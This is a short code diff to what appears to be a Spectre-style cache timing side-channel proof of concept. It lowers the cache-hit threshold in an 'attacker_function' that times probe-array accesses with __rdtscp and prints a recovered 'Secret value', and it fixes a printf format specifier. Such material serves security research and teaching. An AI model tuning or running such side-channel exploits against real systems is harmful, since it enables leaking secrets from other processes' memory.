@@ -12,7 +12,7 @@
 #include <emmintrin.h>
 
 #define NUM_EVENTS 4
-#define CACHE_HIT_THRESHOLD 100
+#define CACHE_HIT_THRESHOLD 45
 
 //std::ofstream output("output.csv");
 //int array_size = 10;
@@ -105,7 +105,7 @@ void attacker_function() {
         val = *addr;
         time2 = __rdtscp(&junk) - time1;
         if (time2 <= CACHE_HIT_THRESHOLD) {
-            printf("Probe array access at index %d is a cache hit, time taken %d cycles.\n", i, time2);
+            printf("Probe array access at index %d is a cache hit, time taken %lld cycles.\n", i, time2);
             printf("Secret value: %c\n", secret_value);
         }
     }
